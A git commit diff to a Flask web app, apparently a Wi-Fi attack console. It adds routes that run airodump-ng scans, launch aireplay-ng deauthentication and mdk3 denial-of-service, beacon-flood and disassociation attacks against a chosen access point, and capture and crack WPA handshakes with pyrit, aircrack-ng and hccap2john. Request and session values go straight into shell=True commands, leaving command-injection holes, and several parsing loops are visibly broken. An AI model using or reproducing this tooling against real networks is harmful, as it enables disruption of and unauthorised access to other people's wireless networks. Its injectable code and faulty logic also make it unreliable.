3efbacb81ad5ddde8ff503eb598da058623ac026
p3n4x0 <p3n4x0@protonmail.com>
2023-12-04 20:02:05 +0100

    some features added

--- app/routes.py
+++ app/routes.py
@@ -1,3 +1,5 @@
+import csv
+import re
 from markupsafe import escape
 from werkzeug.utils import secure_filename
 from flask import request, jsonify, make_response, session
@@ -53,11 +55,50 @@ def stopNetcardMon():
 @app.get('/scan')
 def scan():
     netcardMon = session.get('netcardMon') 
+    path = config['server']['filePath']
+    session["path"] = path
+    scans = []
+
     #TODO:Ejecutar en segundo plano (hilo)
-    startScan = f'airodump-ng -w /tmp/WiFiGhost/dumpData --output-format csv {netcardMon}'
-    #subprocess.run(startScan, check=True, shell=True)
+    startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon}'
+    subprocess.run(startScan, check=True, shell=True)
+
     #TODO:Leer constantemenete la salida para mantener ese monitoreo y actualizar con websockets
+    with open(f"dumpData-01.csv", "r") as csvfile:
+        scanData = csv.reader(csvfile)
+
+        for row in scanData:
+            length = len(row)
+            
+            if length > 0:
+                if is_mac_addres(row[0]) and (length > 0):
+                    bssidStation = row[0]
+                    for station in scans:
+                        if station["bssidStation"] == bssidStation:
+                            continue
+                    if is_mac_addres(row[5]) and (length == 7):   #Clients lines
+                        bssidClient = row[5].replace(" ", "")
+                        for station in scans:
+                            if station["bssidStation"] == bssidClient:
+                                print(station["bssidStation"])
+                                for client in station["clients"]:
+                                    if client == bssidStation:
+                                        continue
+                                station["clients"].append(bssidStation)
+
+                    elif length == 15:                       #Stations lines
+                        channelStation = row[3]
+                        essidStation = row[13]
+                        scan = {
+                            "bssidStation": bssidStation,
+                            "essidStation": essidStation,
+                            "channelStation": channelStation,
+                            "clients": []
+                            }
+                        scans.append(scan)
+    print(scans)            
     return make_response(200)
+
 
 @app.post('/target')
 def target():
@@ -70,32 +111,33 @@ def target():
 @app.post('/attack/<int:id>')
 def attack(id):
     nPackets = escape(request.form['n'])
-    netcardMon = session.get('netcardMon') 
-    essid = session.get('essid')
+    netcardMon = session.get('netcardMon')
     bssid = session.get('bssid')
     channel = session.get('channel')
+    path = session.get('path')
 
+    scans = []
 
     #TODO:Ejecutar en segundo plano y leer constantemenete su actividad para encontrar Handshake
-    startScan = f'airodump-ng -w /tmp/WiFiGhost/dumpDataAttack --output-format csv {netcardMon} -e {essid} --channel {channel}'
+    startScan = f'airodump-ng -w {path}/dumpDataAttack --bssid {bssid} --channel {channel} {netcardMon}'
 
     match id:
         #WPA/WPA2 With Clients
         case 0: #Deauthentication
-            attack = f'aireplay-ng -0 {nPackets} -b {bssid} {netcardMon}'
+            attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
             pass
         case 1: #Fake DoS Attack
-            attack = f'mdk3 {netcardMon} a -a {bssid}'
+            attack = f'mdk3 a -a {bssid} {netcardMon}'
             pass
         case 2: #Beacon Flood Mode Attack
             fakeNets = escape(request.form['fn'])
-            attack = f'mdk3 {netcardMon} b -f {fakeNets} -a -s 1000 -c {channel}'
+            attack = f'mdk3 b -f {fakeNets} -a -s 1000 -c {channel} {netcardMon}'
             pass
         case 3: #Disassociation Amok Mode Attack
-            attack = f'mdk3 {netcardMon} d -w blacklist -c 1'
+            attack = f'mdk3 d -w blacklist -c 1 {netcardMon}'
             pass
         case 4: #Michael Shutdown Explotation
-            attack = f'mdk3 {netcardMon} m -t {bssid}'
+            attack = f'mdk3 m -t {bssid} {netcardMon}'
             pass
 
         #WPA/WPA2 Without Clients
@@ -121,8 +163,53 @@ def attack(id):
     #TODO:ejecutar en un hilo y esperar su finalizacion
     #subprocess.run(attack, check=True, shell=True)
     
-    #Leer csv y buscar handshake
+    #TODO:Leer constantemenete la salida para mantener ese monitoreo y actualizar con websockets
+    with open(f"{path}/dumpData", "r") as csvfile:
+        scanData = csv.reader(csvfile)
+
+    for row in scanData:
+        length = len(row)
+        if length > 0:
+            #TODO: Buscar Handshake
+            continue
+
+    #Comprobar handshake
+    checkHandshake = subprocess.run(f'pyrit -r {path}/dumpDataAttack.cap analyze', check=True, shell=True)
+    
+    #Checkear salida ($?), 1 -> HS no valido ; 0 -> HS valido
+    if checkHandshake.returncode == 1:
+        return make_response("HS not captured", 400)
+
+    #Extraer handshake
+    extractHS = f"aircrack-ng -J {path}/captureHS {path}/dumpDataAttack.cap"
+    extractHash = f"hccap2john {path}/captureHS.hccap > {path}/hash"
+
     return make_response(200)
+
+###Cracking
+
+##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
+@app.post('/crack/<string:wordlist>')
+def cracker(wordlist):
+    path = session.get('path')
+    essid = session.get('essid')
+
+    #Define DB
+    defineDB = f'pyrit -i wordlist/{wordlist} import_passwords'
+    subprocess.run(defineDB, check=True, shell=True)
+
+    #Define ESSID
+    defineDB = f'pyrit -e {essid} create_essid'
+    subprocess.run(defineDB, check=True, shell=True)
+
+    #Generate PMKs
+    generatePMKS = 'pyrit batch'
+    subprocess.run(generatePMKS, check=True, shell=True)
+
+    #Start cracking
+    startAttack =  f'pyrit -r {path}/dumpDataAttack.cap attack_db > hashes/{essid}'
+    subprocess.run(startAttack, check=True, shell=True)
+
 
 
 @app.post('/list/<string:list>')
@@ -147,3 +234,5 @@ def getWordlists(list):
 
     return ls
 
+def is_mac_addres(mac):
+    return bool(re.match('^\s*' + '[\:\-]'.join(['([0-9a-f]{2})'] * 6) + '\s*$', mac.lower()))
